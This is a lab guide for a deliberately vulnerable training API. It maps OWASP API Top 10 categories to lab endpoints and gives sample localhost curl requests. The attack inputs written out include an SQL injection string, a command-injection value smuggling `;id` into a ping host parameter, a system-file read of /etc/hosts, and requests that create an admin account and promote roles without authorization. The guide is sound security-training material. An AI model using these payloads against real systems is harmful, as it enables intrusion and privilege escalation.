# Harbor Cloud API Lab Guide

This guide maps the OWASP API Security Top 10 (2019) to endpoints in this lab. Use it for structured practice.

## API1: Broken Object Level Authorization
- `GET /api/users/{id}`
- `GET /api/orders/{id}`
- `GET /api/users/{id}/orders`

## API2: Broken Authentication
- `POST /api/auth/login` (weak tokens, no signature or expiry)
- `POST /api/auth/reset` (no verification or rate limit)

## API3: Excessive Data Exposure
- `GET /api/users`
- `GET /api/v1/users`
- `GET /api/catalog`

## API4: Lack of Resources & Rate Limiting
- `GET /api/reports?size=1000000`

## API5: Broken Function Level Authorization
- `GET /api/ops/metrics`
- `POST /api/ops/roles/promote/{id}`

## API6: Mass Assignment
- `POST /api/users`
- `PUT /api/users/{id}`

## API7: Security Misconfiguration
- `GET /ops/config`
- `GET /api/ops/files?path=/etc/hosts`

## API8: Injection
- `GET /api/catalog/search?q=' OR 1=1 --`
- `GET /api/ops/ping?host=127.0.0.1;id`

## API9: Improper Assets Management
- `GET /api/v1/users`

## API10: Insufficient Logging & Monitoring
- Minimal logging and no audit trails for auth/privileged actions

## Sample requests

```bash
# BOLA: read another user
curl -s http://localhost:9000/api/users/1

# Mass assignment: create admin user
curl -s -X POST http://localhost:9000/api/users \
  -H 'Content-Type: application/json' \
  -d '{"username":"evil","password":"p@ss","email":"evil@harbor.example","isAdmin":true}'

# BFLA: promote without admin role
curl -s -X POST http://localhost:9000/api/ops/roles/promote/2 \
  -H 'Authorization: Bearer <token>'

# Injection: command injection
curl -s 'http://localhost:9000/api/ops/ping?host=127.0.0.1;id'
